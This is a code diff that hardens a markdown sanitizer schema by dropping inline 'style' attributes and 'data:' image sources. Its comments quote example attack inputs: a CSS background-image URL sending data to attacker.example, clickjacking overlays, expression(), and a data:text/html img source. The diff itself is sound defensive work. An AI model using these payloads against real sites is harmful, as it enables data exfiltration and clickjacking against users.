@@ -16,21 +16,30 @@ import { table, th, td } from "./table";
 // few markdown-friendly additions. The defaults strip `<script>`, event
 // handlers, `javascript:` URLs, and most dangerous attributes; we layer
 // on:
-//   - class / id / style on common block + inline elements (so authored
-//     HTML keeps its visual intent in rich previews),
+//   - class / id on common block + inline elements (so authored HTML
+//     keeps its hooks for styling in rich previews),
 //   - `<img>` (kept disabled in defaults), with safe src schemes only,
 //   - `<details>` / `<summary>` for collapsible sections,
 //   - `target` / `rel` on anchors so external links keep working.
+//
+// We deliberately do NOT allow `style` — `rehype-sanitize` cannot parse
+// CSS, so allowing `style` would let an authored doc smuggle in
+// `background-image: url("https://attacker.example/exfil?…")` (data
+// exfiltration), `position: fixed; top: 0; …` (clickjacking overlays),
+// or vendor-specific quirks like `expression(…)` on old browsers.
+// If we ever need inline styling we should plug in a CSS-property
+// sanitizer at that point, not before.
+//
+// We also deliberately do NOT allow the `data:` protocol — that scheme
+// covers arbitrary mime types, not just images, so `<img src="data:text/html,…">`
+// would round-trip an HTML document with no schema validation. Inline
+// base64 images are a thin convenience we don't actually need in our
+// preview, and the cost of allowing them is too high.
 const MARKDOWN_SANITIZE_SCHEMA: Schema = {
   ...defaultSchema,
   attributes: {
     ...defaultSchema.attributes,
-    "*": [
-      ...(defaultSchema.attributes?.["*"] ?? []),
-      "className",
-      "id",
-      "style",
-    ],
+    "*": [...(defaultSchema.attributes?.["*"] ?? []), "className", "id"],
     a: [
       ...(defaultSchema.attributes?.a ?? []),
       "target",
@@ -58,10 +67,9 @@ const MARKDOWN_SANITIZE_SCHEMA: Schema = {
     "sub",
     "sup",
   ],
-  // Allow only http(s), data:image/, and protocol-relative URLs in src/href.
   protocols: {
     ...defaultSchema.protocols,
-    src: ["http", "https", "data"],
+    src: ["http", "https"],
     href: ["http", "https", "mailto", "tel"],
   },
 };
